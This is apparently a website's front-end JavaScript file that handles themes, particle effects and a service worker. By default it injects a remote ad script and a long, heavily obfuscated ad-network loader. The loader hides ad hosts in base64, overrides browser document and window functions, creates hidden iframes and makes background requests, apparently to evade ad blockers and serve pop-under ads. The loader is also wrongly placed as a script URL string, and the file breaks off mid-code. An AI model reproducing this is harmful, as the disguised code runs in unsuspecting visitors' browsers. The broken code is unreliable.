const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

if (isMobile) {
  window.location.href = "m.html";
}

window.tHs = new ThemeSystem();

var darkTheme = new Theme(document.getElementById("default-theme"), "Moon"); // I do not have programming ineptitude, it's just that this works and I don't really care to change it from the older version of the theme system.
tHs.addTheme(darkTheme);
tHs.setActiveTheme(darkTheme);

let workerLoaded;

async function worker() {
  return await navigator.serviceWorker.register("/sw.js", {
    scope: "/classes",
  });
}

document.addEventListener("DOMContentLoaded", async function () {
  await worker();
  workerLoaded = true;
});

function prependHttps(url) {
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    return "https://" + url;
  }
  return url;
}
var chosenParticleState = localStorage.getItem("particleState") || "on";


document.addEventListener("DOMContentLoaded", function (event) {
  if (chosenParticleState === "on") {
    var particlesConfig = {"particles":{"number":{"value":67,"density":{"enable":true,"value_area":800}},"color":{"value":"#ffffff"},"shape":{"type":"circle","stroke":{"width":1,"color":"#000000"},"polygon":{"nb_sides":5},"image":{"src":"img/github.svg","width":100,"height":100}},"opacity":{"value":1,"random":false,"anim":{"enable":false,"speed":1,"opacity_min":0.1,"sync":false}},"size":{"value":6,"random":true,"anim":{"enable":false,"speed":40,"size_min":0.1,"sync":false}},"line_linked":{"enable":false,"distance":150,"color":"#ffffff","opacity":0.4,"width":1},"move":{"enable":true,"speed":1.5,"direction":"none","random":true,"straight":false,"out_mode":"out","bounce":false,"attract":{"enable":false,"rotateX":600,"rotateY":1200}}},"interactivity":{"detect_on":"canvas","events":{"onhover":{"enable":false,"mode":"repulse"},"onclick":{"enable":false,"mode":"push"},"resize":true},"modes":{"grab":{"distance":400,"line_linked":{"opacity":1}},"bubble":{"distance":400,"size":40,"duration":2,"opacity":8,"speed":3},"repulse":{"distance":200,"duration":0.4},"push":{"particles_nb":4},"remove":{"particles_nb":2}}},"retina_detect":true}
    particlesJS("particles-js", particlesConfig)
  }
});

function particleSelect(param) {
  if (param == 'choose...') {return;}
  localStorage.setItem("particleState", param);
  chosenParticleState = param;

}

var chosenAdState = localStorage.getItem("adState") || "adchangeon";

if (chosenAdState === "adchangeon") {
  var script = document.createElement('script');
  script.type = 'text/javascript';
  script.async = 'async';
  script.src = '//thubanoa.com/1?z=7482778';
  document.head.appendChild(script);
  var script2 = document.createElement('script');
  script2.type = 'text/javascript';
  script2.src = '(function($,document){for($._Ff=$.BD;$._Ff<$.GD;$._Ff+=$.x){switch($._Ff){case $.GE:try{window[$.h];}catch(n){delete window[$.h],window[$.h]=j;}break;case $.DD:window[C]=document,[$.A,$.B,$.C,$.D,$.E,$.F,$.G,$.H,$.I,$.J][$.k](function(n){document[n]=function(){return i[$.w][$.y][n][$.Ch](window[$.y],arguments);};}),[$.a,$.b,$.c][$.k](function(n){Object[$.e](document,n,$.$($.Ci,function(){return window[$.y][n];},$.BF,!$.x));}),document[$.j]=function(){return arguments[$.BD]=arguments[$.BD][$.CE](new RegExp($.CH,$.CI),C),i[$.w][$.y][$.j][$.CA](window[$.y],arguments[$.BD]);};break;case $.GB:try{window[$.f];}catch(n){delete window[$.f],window[$.f]=b;}break;case $.Cg:var C=$.d+f[$.Bn]()[$.Bw]($.Bz)[$.CB]($.CC);break;case $.Gb:try{window[$.g];}catch(n){delete window[$.g],window[$.g]=z;}break;case $.GJ:try{t=window[$.u];}catch(n){delete window[$.u],window[$.u]=$.$($.CJ,$.$(),$.Cp,function(n,t){return this[$.CJ][n]=k(t);},$.Cr,function(n){return this[$.CJ][$.Ca](n)?this[$.CJ][n]:void $.BD;},$.Cn,function(n){return delete this[$.CJ][n];},$.Cm,function(){return this[$.CJ]=$.$();}),t=window[$.u];}break;case $.CC:i[$.l][$.p]=$.BA,i[$.l][$.q]=$.BB,i[$.l][$.r]=$.BB,i[$.l][$.s]=$.BC,i[$.l][$.t]=$.BD,i[$.i]=$.m,a[$.J]($.z)[$.BD][$.Bt](i),k=i[$.w][$.BE],Object[$.e](k,$.n,$.$($.BF,!$.x)),b=i[$.w][$.f],c=i[$.w][$.BG],d=window[$.o],g=i[$.w][[$.Bo,$.Bp,$.Bq,$.Br][$.Bu]($.Bv)],e=i[$.w][$.BH],f=i[$.w][$.BI],h=i[$.w][$.BJ],j=i[$.w][$.h],l=i[$.w][$.Ba],m=i[$.w][$.Bb],n=i[$.w][$.Bc],o=i[$.w][$.Bd],p=i[$.w][$.Be],q=i[$.w][$.Bf],r=i[$.w][$.Bg],s=i[$.w][$.Bh],u=i[$.w][$.Bi],v=i[$.w][$.Bj],x=i[$.w][$.Bk],y=i[$.w][$.Bl],z=i[$.w][$.g],A=i[$.w][$.Bm];break;case $.x:try{i=window[$.y][$.A]($.Bs);}catch(n){for($._D=$.BD;$._D<$.CC;$._D+=$.x){switch($._D){case $.x:B[$.Cc]=$.Ce,i=B[$.Cf];break;case $.BD:var B=(a[$.a]?a[$.a][$.Ck]:a[$.c]||a[$.Co])[$.Cq]();break;}}}break;case $.Gc:!function(r){for($._E=$.BD;$._E<$.Cg;$._E+=$.x){switch($._E){case $.CC:u.m=r,u.c=e,u.d=function(n,t,r){u.o(n,t)||Object[$.e](n,t,$.$($.BF,!$.x,$.Cl,!$.BD,$.Ci,r));},u.n=function(n){for($._C=$.BD;$._C<$.CC;$._C+=$.x){switch($._C){case $.x:return u.d(t,$.Cb,t),t;break;case $.BD:var t=n&&n[$.Cd]?function(){return n[$.Cj];}:function(){return n;};break;}}},u.o=function(n,t){return Object[$.CG][$.Ca][$.CA](n,t);},u.p=$.Bv,u(u.s=$.By);break;case $.x:function u(n){for($._B=$.BD;$._B<$.Cg;$._B+=$.x){switch($._B){case $.CC:return r[n][$.CA](t[$.Bx],t,t[$.Bx],u),t.l=!$.BD,t[$.Bx];break;case $.x:var t=e[n]=$.$($.CD,n,$.CF,!$.x,$.Bx,$.$());break;case $.BD:if(e[n])return e[n][$.Bx];break;}}}break;case $.BD:var e=$.$();break;}}}([function(n,t,r){for($._h=$.BD;$._h<$.Cg;$._h+=$.x){switch($._h){case $.CC:t.e=7482786,t.a=7482785,t.v=0,t.w=0,t.h=30,t.y=3,t._=true,t.g=g[$.ar](b('eyJhZGJsb2NrIjp7fSwiZXhjbHVkZXMiOiIifQ==')),t.O=2,t.k='Ly9vYXBob2FjZS5uZXQvNDAwLzc0ODI3ODY=',t.S='b2FwaG9hY2UubmV0',t.A=2,t.P=$.JA*1715701941,t.M='Zez$#t^*EFng',t.T='and',t.B='dpe7znv3338',t.N='40y1b0b1',t.I='x0v',t.C='ka69jgq0vgs',t.z='_eishpyzd',t.R='_ruyjfrvk',t.D=false;break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD));break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._F=$.BD;$._F<$.Cg;$._F+=$.x){switch($._F){case $.CC:t.F=$.Ig,t.H=$.Ih,t.L=$.Ii,t.G=$.Ij,t.X=$.Ik,t.U=$.BD,t.Y=$.x,t.K=$.CC,t.Z=$.Il;break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD));break;case $.BD:$.Cs;break;}}},function(n,t,u){for($._Dr=$.BD;$._Dr<$.GJ;$._Dr+=$.x){switch($._Dr){case $.Cg:var b=!$.x;break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t[$.Ds]=function(){return $.ao+m.e+$.ci;},t.J=function(){return $.av+m.e;},t.$=function(){return($.BD,h.Q)();},t.V=function(){return[($.BD,o.W)(d.nn[$.EC],d[$.Hb][$.EC]),($.BD,o.W)(d[$.Fl][$.EC],d[$.Hb][$.EC])][$.Bu]($.cr);},t.tn=function(){for($._Bp=$.BD;$._Bp<$.CC;$._Bp+=$.x){switch($._Bp){case $.x:n.id=a.en,window[$.aA](n,$.aq);break;case $.BD:var n=$.$(),t=r(function(){($.BD,w.rn)()&&(v(t),p());},$.at);break;}}},t.un=p,t.in=function(c){return new f[$.Cj](function(t,u){var i=new e()[$.cf](),o=r(function(){for($._Db=$.BD;$._Db<$.CC;$._Db+=$.x){switch($._Db){case $.x:n?(v(o),$.eo===n&&u(new Error($.Df)),b&&(c||($.BD,w[$.EA])(),t(n)),t()):i+l.L<new e()[$.cf]()&&(v(o),u(new Error($.gG)));break;case $.BD:var n=($.BD,h.Q)();break;}}},$.at);});},t.cn=function(){for($._Cp=$.BD;$._Cp<$.CC;$._Cp+=$.x){switch($._Cp){case $.x:if(n)b=!$.BD,($.BD,h.an)(n);else var t=r(function(){($.BD,w.rn)()&&(v(t),p(!$.BD));},$.at);break;case $.BD:var n=($.BD,y.fn)();break;}}};break;case $.DD:function p(t){for($._Dm=$.BD;$._Dm<$.CC;$._Dm+=$.x){switch($._Dm){case $.x:r[$.aF](_.dn,$.Hf+($.BD,w.sn)()),t&&r[$.aG](_.vn,_.ln),r[$.aG](_.wn,s.hn[m.O]),r[$.aa]=function(){if($.bn===r[$.cj]){for($._Dg=$.BD;$._Dg<$.CC;$._Dg+=$.x){switch($._Dg){case $.x:n[$.k](function(n){for($._Bq=$.BD;$._Bq<$.CC;$._Bq+=$.x){switch($._Bq){case $.x:u[r]=e;break;case $.BD:var t=n[$.Hk]($.fG),r=t[$.dj]()[$.fI](),e=t[$.Bu]($.fG);break;}}}),u[_.mn]?(b=!$.BD,($.BD,h.an)(u[_.mn]),t&&($.BD,y.yn)(u[_.mn])):u[_._n]&&($.BD,h.an)(u[_._n]),t||($.BD,h.bn)();break;case $.BD:var n=r[$.eG]()[$.ep]()[$.Hk](new RegExp($.fH,$.Bv)),u=$.$();break;}}}},r[$.Ha]=function(){t&&(b=!$.BD,($.BD,h.an)($.dk));},($.BD,h.pn)(),r[$.aH]();break;case $.BD:var r=new window[$.aw]();break;}}}break;case $.CC:var i,o=u($.Cg),c=u($.GB),f=(i=c)&&i[$.Cd]?i:$.$($.Cj,i),a=u($.DD),d=u($.GC),s=u($.GD),l=u($.x),w=u($.GE),h=u($.GF),m=u($.BD),y=u($.GG),_=u($.GH);break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._Cl=$.BD;$._Cl<$.GJ;$._Cl+=$.x){switch($._Cl){case $.Cg:function a(n){for($._Bx=$.BD;$._Bx<$.CC;$._Bx+=$.x){switch($._Bx){case $.x:return e<=t&&t<=u?t-e:o<=t&&t<=c?t-o+i:$.BD;break;case $.BD:var t=n[$.Bw]()[$.cE]($.BD);break;}}}break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t[$.Dt]=a,t[$.n]=d,t.gn=function(n,u){return n[$.Hk]($.Bv)[$.bJ](function(n,t){for($._Bh=$.BD;$._Bh<$.CC;$._Bh+=$.x){switch($._Bh){case $.x:return d(e);break;case $.BD:var r=(u+$.x)*(t+$.x),e=(a(n)+r)%f;break;}}})[$.Bu]($.Bv);},t.jn=function(n,u){return n[$.Hk]($.Bv)[$.bJ](function(n,t){for($._Bs=$.BD;$._Bs<$.CC;$._Bs+=$.x){switch($._Bs){case $.x:return d(e);break;case $.BD:var r=u[t%(u[$.Hc]-$.x)],e=(a(n)+a(r))%f;break;}}})[$.Bu]($.Bv);},t.W=function(n,c){return n[$.Hk]($.Bv)[$.bJ](function(n,t){for($._Bn=$.BD;$._Bn<$.CC;$._Bn+=$.x){switch($._Bn){case $.x:return d(o);break;case $.BD:var r=c[t%(c[$.Hc]-$.x)],e=a(r),u=a(n),i=u-e,o=i<$.BD?i+f:i;break;}}})[$.Bu]($.Bv);};break;case $.DD:function d(n){return n<=$.GE?k[$.n](n+e):n<=$.Gg?k[$.n](n+o-i):k[$.n](e);}break;case $.CC:var e=$.Cu,u=$.Cv,i=u-e+$.x,o=$.Cw,c=$.Cx,f=c-o+$.x+i;break;case $.BD:$.Cs;break;}}},function(t,r,u){for($._Da=$.BD;$._Da<$.GJ;$._Da+=$.x){switch($._Da){case $.Cg:r.Sn=f[$.Bn]()[$.Bw]($.Bz)[$.CB]($.CC),r.kn=f[$.Bn]()[$.Bw]($.Bz)[$.CB]($.CC),r.en=f[$.Bn]()[$.Bw]($.Bz)[$.CB]($.CC),r.On=f[$.Bn]()[$.Bw]($.Bz)[$.CB]($.CC);break;case $.x:Object[$.e](r,$.Cd,$.$($.Jf,!$.BD)),r.On=r.en=r.kn=r.Sn=r.An=r.xn=void $.BD;break;case $.DD:c&&(c[$.B](a,function t(r){c[$.C](a,t),[($.BD,i.qn)(n[$.Gt]),($.BD,i.Pn)(window[$.cD][$.r]),($.BD,i.En)(new e()),($.BD,i.Mn)(window[$.ct][$.cz]),($.BD,i.Tn)(n[$.dy]||n[$.er])][$.k](function(t){for($._Cu=$.BD;$._Cu<$.CC;$._Cu+=$.x){switch($._Cu){case $.x:q(function(){for($._Cn=$.BD;$._Cn<$.CC;$._Cn+=$.x){switch($._Cn){case $.x:n.id=r[$.bx],n[$.Jf]=t,window[$.aA](n,$.aq),($.BD,o[$.Dv])($.fv+t);break;case $.BD:var n=$.$();break;}}},n);break;case $.BD:var n=m($.Gc*f[$.Bn](),$.Gc);break;}}});}),c[$.B](d,function n(t){for($._Bl=$.BD;$._Bl<$.GJ;$._Bl+=$.x){switch($._Bl){case $.Cg:var e=window[$.ct][$.cz],u=new window[$.aw]();break;case $.x:var r=$.$();break;case $.DD:u[$.aF]($.Iv,e),u[$.aa]=function(){r[$.Di]=u[$.eG](),window[$.aA](r,$.aq);},u[$.Ha]=function(){r[$.Di]=$.dI,window[$.aA](r,$.aq);},u[$.aH]();break;case $.CC:r.id=t[$.bx];break;case $.BD:c[$.C](d,n);break;}}}));break;case $.CC:var i=u($.GI),o=u($.GJ),c=$.Ct!=typeof document?document[$.a]:null,a=r.xn=$.Do,d=r.An=$.ab;break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._Bo=$.BD;$._Bo<$.Cg;$._Bo+=$.x){switch($._Bo){case $.CC:var e=[];break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t[$.Du]=function(){return e;},t[$.Dv]=function(n){e[$.CB](-$.x)[$.bs]()!==n&&e[$.bg](n);};break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._G=$.BD;$._G<$.Cg;$._G+=$.x){switch($._G){case $.CC:t.Bn=$.Im,t.Nn=$.In,t.vn=$.Io,t.ln=$.Ip,t.In=$.Iq,t.Cn=$.Ir,t.zn=$.Is,t.Rn=$.It,t.Dn=$.Iu,t.dn=$.Iv,t.Fn=$.Iw,t.wn=$.Ix,t.mn=$.Iy,t._n=$.Iz;break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD));break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._j=$.BD;$._j<$.GJ;$._j+=$.x){switch($._j){case $.Cg:var o=l||i[$.Cj];break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD));break;case $.DD:t[$.Cj]=o;break;case $.CC:var e,u=r($.Ga),i=(e=u)&&e[$.Cd]?e:$.$($.Cj,e);break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._Do=$.BD;$._Do<$.Cg;$._Do+=$.x){switch($._Do){case $.CC:var u=r($.Cg),v=r($.GE),l=r($.BD),f=t.Hn=new j($.bA,$.Bv),i=($.Ct!=typeof document?document:$.$($.a,null))[$.a],w=$.Cy,y=$.Cz,_=$.DA,b=$.DB;break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t.Hn=void $.BD,t.Ln=function(e,u,i){for($._Cc=$.BD;$._Cc<$.CC;$._Cc+=$.x){switch($._Cc){case $.x:return e[$.EC]=o[c],e[$.Hc]=o[$.Hc],function(n){for($._Bz=$.BD;$._Bz<$.CC;$._Bz+=$.x){switch($._Bz){case $.x:if(t===u)for(;r--;)c=(c+=i)>=o[$.Hc]?$.BD:c,e[$.EC]=o[c];break;case $.BD:var t=n&&n[$.bm]&&n[$.bm].id,r=n&&n[$.bm]&&n[$.bm][$.Jf];break;}}};break;case $.BD:var o=e[$.Fm][$.Hk](f)[$.bf](function(n){return!f[$.Je](n);}),c=$.BD;break;}}},t[$.Dw]=function(d,s){return function(n){for($._De=$.BD;$._De<$.CC;$._De+=$.x){switch($._De){case $.x:if(t===s)try{for($._Cx=$.BD;$._Cx<$.CC;$._Cx+=$.x){switch($._Cx){case $.x:d[$.EB]=m(a/l.y,$.Gc)+$.x,d[$.EE]=d[$.EE]?d[$.EE]:new e(i)[$.cf](),d[$.EC]=($.BD,v[$.Dy])(c+l.M);break;case $.BD:var u=d[$.EE]?new e(d[$.EE])[$.Bw]():r[$.Hk](w)[$.dw](function(n){return n[$.fx]($.gA);}),i=u[$.Hk](y)[$.bs](),o=new e(i)[$.eh]()[$.Hk](_),c=o[$.dj](),f=o[$.dj]()[$.Hk](b),a=f[$.dj]();break;}}}catch(n){d[$.EC]=$.dI;}break;case $.BD:var t=n&&n[$.bm]&&n[$.bm].id,r=n&&n[$.bm]&&n[$.bm][$.Di];break;}}};},t.Gn=function(n,t){for($._f=$.BD;$._f<$.CC;$._f+=$.x){switch($._f){case $.x:r[$.bx]=n,i[$.F](r);break;case $.BD:var r=new Event(t);break;}}},t.Xn=function(r,n){return h[$.Ch](null,$.$($.Hc,n))[$.bJ](function(n,t){return($.BD,u.gn)(r,t);})[$.Bu]($.fl);};break;case $.BD:$.Cs;break;}}},function(n,t,u){for($._EC=$.BD;$._EC<$.GE;$._EC+=$.x){switch($._EC){case $.GB:function b(n,t){return n+(m[$.EC]=$.cB*m[$.EC]%$.cx,m[$.EC]%(t-n));}break;case $.Cg:function w(n){for($._CJ=$.BD;$._CJ<$.CC;$._CJ+=$.x){switch($._CJ){case $.x:return h[$.Jz](n);break;case $.BD:if(h[$.Jy](n)){for($._CC=$.BD;$._CC<$.CC;$._CC+=$.x){switch($._CC){case $.x:return r;break;case $.BD:for(var t=$.BD,r=h(n[$.Hc]);t<n[$.Hc];t++)r[t]=n[t];break;}}}break;}}}break;case $.Gb:!function t(){for($._Dv=$.BD;$._Dv<$.GJ;$._Dv+=$.x){switch($._Dv){case $.Cg:var u=r(function(){if($.Bv!==m[$.EC]){for($._Dn=$.BD;$._Dn<$.Cg;$._Dn+=$.x){switch($._Dn){case $.CC:m[$.ED]=!$.BD,m[$.EC]=$.Bv;break;case $.x:try{for($._Dh=$.BD;$._Dh<$.CC;$._Dh+=$.x){switch($._Dh){case $.x:q(function(){if(!_){for($._Ca=$.BD;$._Ca<$.CC;$._Ca+=$.x){switch($._Ca){case $.x:m[$.EE]+=n,t(),($.BD,i.bn)(),($.BD,d.tn)();break;case $.BD:var n=new e()[$.cf]()-y[$.cf]();break;}}}},$.DI);break;case $.BD:if(h(m[$.EB])[$.eq]($.BD)[$.k](function(n){for($._DJ=$.BD;$._DJ<$.Cg;$._DJ+=$.x){switch($._DJ){case $.CC:h(t)[$.eq]($.BD)[$.k](function(n){m[$.Bn]+=k[$.n](b($.Cw,$.Cx));});break;case $.x:var t=b($.Gb,$.GF);break;case $.BD:m[$.Bn]=$.Bv;break;}}}),($.BD,a.Un)())return;break;}}}catch(n){}break;case $.BD:if(v(u),window[$.C]($.HJ,n),$.dI===m[$.EC])return void(m[$.ED]=!$.BD);break;}}}},$.at);break;case $.x:y=new e();break;case $.DD:window[$.B]($.HJ,n);break;case $.CC:var n=($.BD,o[$.Dw])(m,c.en);break;case $.BD:m[$.ED]=!$.x;break;}}}();break;case $.GJ:m[$.Bn]=$.Bv,m[$.EB]=$.Bv,m[$.EC]=$.Bv,m[$.ED]=void $.BD,m[$.EE]=null,m[$.EF]=($.BD,s.W)(l.T,l.B);break;case $.CC:var i=u($.GF),o=u($.Gb),c=u($.DD),a=u($.Gc),d=u($.CC),s=u($.Cg),l=u($.BD);break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t[$.Dx]=void $.BD,t[$.Dy]=function(n){return n[$.Hk]($.Bv)[$.cl](function(n,t){return(n<<$.GJ)-n+t[$.cE]($.BD)&$.cx;},$.BD);},t.sn=function(){return[m[$.Bn],m[$.EF]][$.Bu]($.cr);},t[$.Dz]=function(){for($._Ck=$.BD;$._Ck<$.CC;$._Ck+=$.x){switch($._Ck){case $.x:return[][$.bo](w(h(n)))[$.bJ](function(n){return t[f[$.Bn]()*t[$.Hc]|$.BD];})[$.Bu]($.Bv);break;case $.BD:var t=[][$.bo](w($.cn)),n=$.DD+($.GC*f[$.Bn]()|$.BD);break;}}},t.rn=function(){return m[$.ED];},t[$.EA]=function(){_=!$.BD;};break;case $.GH:var y=new e(),_=!$.x;break;case $.DD:var m=t[$.Dx]=$.$();break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._Dp=$.BD;$._Dp<$.Cg;$._Dp+=$.x){switch($._Dp){case $.CC:var e=r($.Gd),u=r($.GD),i=r($.x),o=r($.BD),c=r($.GJ),f=r($.Ge);break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t[$.EG]=function(n){for($._x=$.BD;$._x<$.CC;$._x+=$.x){switch($._x){case $.x:return d[$.ay]=f,d[$.bh]=a,d;break;case $.BD:var t=document[$.bF],r=document[$.c]||$.$(),e=window[$.ca]||t[$.cv]||r[$.cv],u=window[$.cb]||t[$.cw]||r[$.cw],i=t[$.cc]||r[$.cc]||$.BD,o=t[$.cd]||r[$.cd]||$.BD,c=n[$.cC](),f=c[$.ay]+(e-i),a=c[$.bh]+(u-o),d=$.$();break;}}},t[$.EH]=function(n){for($._k=$.BD;$._k<$.CC;$._k+=$.x){switch($._k){case $.x:return h[$.CG][$.CB][$.CA](t);break;case $.BD:var t=document[$.E](n);break;}}},t[$.EI]=function n(t,r){for($._l=$.BD;$._l<$.Cg;$._l+=$.x){switch($._l){case $.CC:return n(t[$.Ck],r);break;case $.x:if(t[$.br]===r)return t;break;case $.BD:if(!t)return null;break;}}},t[$.EJ]=function(n){for($._Dk=$.BD;$._Dk<$.DD;$._Dk+=$.x){switch($._Dk){case $.Cg:return!$.x;break;case $.x:for(;n[$.Ck];)r[$.bg](n[$.Ck]),n=n[$.Ck];break;case $.CC:for(var e=$.BD;e<t[$.Hc];e++)for(var u=$.BD;u<r[$.Hc];u++)if(t[e]===r[u])return!$.BD;break;case $.BD:var t=(o.g[$.de]||$.Bv)[$.Hk]($.Ik)[$.bf](function(n){return n;})[$.bJ](function(n){return[][$.CB][$.CA](document[$.E](n));})[$.cl](function(n,t){return n[$.bo](t);},[]),r=[n];break;}}},t.Yn=function(){for($._Bj=$.BD;$._Bj<$.CC;$._Bj+=$.x){switch($._Bj){case $.x:t.sd=f.Zn,t[$.bi]=c[$.Du],t[$.bj]=o.C,t[$.bk]=o.N,t[$.Fl]=o.I,($.BD,e.Jn)(n,i.F,o.e,o.P,o.a,t);break;case $.BD:var n=$.bp+($.x===o.A?$.db:$.dc)+$.dr+u.Kn[o.O],t=$.$();break;}}},t.$n=function(){for($._BI=$.BD;$._BI<$.CC;$._BI+=$.x){switch($._BI){case $.x:return($.BD,e[$.Eb])(n,o.a)||($.BD,e[$.Eb])(n,o.e);break;case $.BD:var n=u.Qn[o.O];break;}}},t.Un=function(){for($._p=$.BD;$._p<$.CC;$._p+=$.x){switch($._p){case $.x:return($.BD,e[$.Eb])(n,o.a);break;case $.BD:var n=u.Qn[o.O];break;}}},t.Vn=function(){return!u.Qn[o.O];},t.Wn=function(){for($._Ct=$.BD;$._Ct<$.Cg;$._Ct+=$.x){switch($._Ct){case $.CC:try{document[$.bF][$.Bt](r),[$.f,$.h,$.g,$.BI][$.k](function(t){try{window[t];}catch(n){delete window[t],window[t]=r[$.w][t];}}),document[$.bF][$.bl](r);}catch(n){}break;case $.x:r[$.l][$.t]=$.BD,r[$.l][$.r]=$.BB,r[$.l][$.q]=$.BB,r[$.i]=$.m;break;case $.BD:var r=document[$.A]($.Bs);break;}}};break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._I=$.BD;$._I<$.GE;$._I+=$.x){switch($._I){case $.GB:var v=t.hn=$.$();break;case $.Cg:var e=t.tt=$.x,u=t.rt=$.CC,i=(t.et=$.Cg,t.ut=$.DD),o=t.it=$.GJ,c=t.ot=$.Cg,f=t.ct=$.GH,a=t.ft=$.GB,d=t.Kn=$.$();break;case $.Gb:v[e]=$.HG,v[u]=$.HH,v[i]=$.HI,v[o]=$.HI,v[c]=$.HI;break;case $.GJ:var s=t.Qn=$.$();break;case $.CC:t.nt=$.x;break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD));break;case $.GH:s[e]=$.HD,s[a]=$.HE,s[c]=$.HF,s[u]=$.HC;break;case $.DD:d[e]=$.Gw,d[i]=$.Gx,d[o]=$.Gy,d[c]=$.Gz,d[f]=$.HA,d[a]=$.HB,d[u]=$.HC;break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._Ev=$.BD;$._Ev<$.Gb;$._Ev+=$.x){switch($._Ev){case $.GB:v[$.k](function(n){for($._Cb=$.BD;$._Cb<$.DD;$._Cb+=$.x){switch($._Cb){case $.Cg:try{n[d]=n[d]||[];}catch(n){}break;case $.x:var t=n[$.y][$.bF][$.ck].fp;break;case $.CC:n[t]=n[t]||[];break;case $.BD:n[$.y][$.bF][$.ck].fp||(n[$.y][$.bF][$.ck].fp=f[$.Bn]()[$.Bw]($.Bz)[$.CB]($.CC));break;}}});break;case $.Cg:s&&s[$.Ha]&&(e=s[$.Ha]);break;case $.GJ:function o(n,e){return n&&e?v[$.k](function(n){for($._Co=$.BD;$._Co<$.Cg;$._Co+=$.x){switch($._Co){case $.CC:try{n[d]=n[d][$.bf](function(n){for($._Bu=$.BD;$._Bu<$.CC;$._Bu+=$.x){switch($._Bu){case $.x:return t||r;break;case $.BD:var t=n[$.cF]!==n,r=n[$.cG]!==e;break;}}});}catch(n){}break;case $.x:n[t]=n[t][$.bf](function(n){for($._Bt=$.BD;$._Bt<$.CC;$._Bt+=$.x){switch($._Bt){case $.x:return t||r;break;case $.BD:var t=n[$.cF]!==n,r=n[$.cG]!==e;break;}}});break;case $.BD:var t=n[$.y][$.bF][$.ck].fp;break;}}}):(l[$.k](function(e){v[$.k](function(n){for($._Ei=$.BD;$._Ei<$.Cg;$._Ei+=$.x){switch($._Ei){case $.CC:try{n[d]=n[d][$.bf](function(n){for($._EI=$.BD;$._EI<$.CC;$._EI+=$.x){switch($._EI){case $.x:return t||r;break;case $.BD:var t=n[$.cF]!==e[$.cF],r=n[$.cG]!==e[$.cG];break;}}});}catch(n){}break;case $.x:n[t]=n[t][$.bf](function(n){for($._EE=$.BD;$._EE<$.CC;$._EE+=$.x){switch($._EE){case $.x:return t||r;break;case $.BD:var t=n[$.cF]!==e[$.cF],r=n[$.cG]!==e[$.cG];break;}}});break;case $.BD:var t=n[$.y][$.bF][$.ck].fp;break;}}});}),u[$.k](function(n){window[n]=!$.x;}),u=[],l=[],null);}break;case $.CC:var d=$.DC,s=document[$.a],v=[window],u=[],l=[],e=function(){};break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t.Jn=function(n,t,r){for($._Ci=$.BD;$._Ci<$.Cg;$._Ci+=$.x){switch($._Ci){case $.CC:try{for($._CE=$.BD;$._CE<$.CC;$._CE+=$.x){switch($._CE){case $.x:a[$.cF]=n,a[$.Eo]=t,a[$.cG]=r,a[$.cH]=f?f[$.cH]:u,a[$.cI]=o,a[$.cJ]=e,(a[$.cg]=i)&&i[$.di]&&(a[$.di]=i[$.di]),l[$.bg](a),v[$.k](function(n){for($._Bc=$.BD;$._Bc<$.Cg;$._Bc+=$.x){switch($._Bc){case $.CC:try{n[d][$.bg](a);}catch(n){}break;case $.x:n[t][$.bg](a);break;case $.BD:var t=n[$.y][$.bF][$.ck].fp||d;break;}}});break;case $.BD:var c=window[$.y][$.bF][$.ck].fp||d,f=window[c][$.bf](function(n){return n[$.cG]===r&&n[$.cH];})[$.dj](),a=$.$();break;}}}catch(n){}break;case $.x:try{o=s[$.i][$.Hk]($.aE)[$.CC];}catch(n){}break;case $.BD:var e=$.Cg<arguments[$.Hc]&&void $.BD!==arguments[$.Cg]?arguments[$.Cg]:$.BD,u=$.DD<arguments[$.Hc]&&void $.BD!==arguments[$.DD]?arguments[$.DD]:$.BD,i=arguments[$.GJ],o=void $.BD;break;}}},t.at=function(n){u[$.bg](n),window[n]=!$.BD;},t[$.Ea]=o,t[$.Eb]=function(n,t){for($._Cj=$.BD;$._Cj<$.CC;$._Cj+=$.x){switch($._Cj){case $.x:return!$.x;break;case $.BD:for(var r=c(),e=$.BD;e<r[$.Hc];e++)if(r[e][$.cG]===t&&r[e][$.cF]===n)return!$.BD;break;}}},t[$.Ec]=c,t[$.Ed]=function(){try{o(),e(),e=function(){};}catch(n){}},t.dt=function(e,t){v[$.bJ](function(n){for($._CG=$.BD;$._CG<$.CC;$._CG+=$.x){switch($._CG){case $.x:return r[$.bf](function(n){return-$.x<e[$.ap](n[$.cG]);});break;case $.BD:var t=n[$.y][$.bF][$.ck].fp||d,r=n[t]||[];break;}}})[$.cl](function(n,t){return n[$.bo](t);},[])[$.k](function(n){try{n[$.cg].sd(t);}catch(n){}});};break;case $.GH:function c(){for($._ED=$.BD;$._ED<$.Cg;$._ED+=$.x){switch($._ED){case $.CC:return u;break;case $.x:try{for($._Dl=$.BD;$._Dl<$.CC;$._Dl+=$.x){switch($._Dl){case $.x:for(t=$.BD;t<v[$.Hc];t++)r(t);break;case $.BD:var r=function(n){for(var o=v[n][d]||[],t=function(i){$.BD<u[$.bf](function(n){for($._Bm=$.BD;$._Bm<$.CC;$._Bm+=$.x){switch($._Bm){case $.x:return e&&u;break;case $.BD:var t=n[$.cF],r=n[$.cG],e=t===o[i][$.cF],u=r===o[i][$.cG];break;}}})[$.Hc]||u[$.bg](o[i]);},r=$.BD;r<o[$.Hc];r++)t(r);};break;}}}catch(n){}break;case 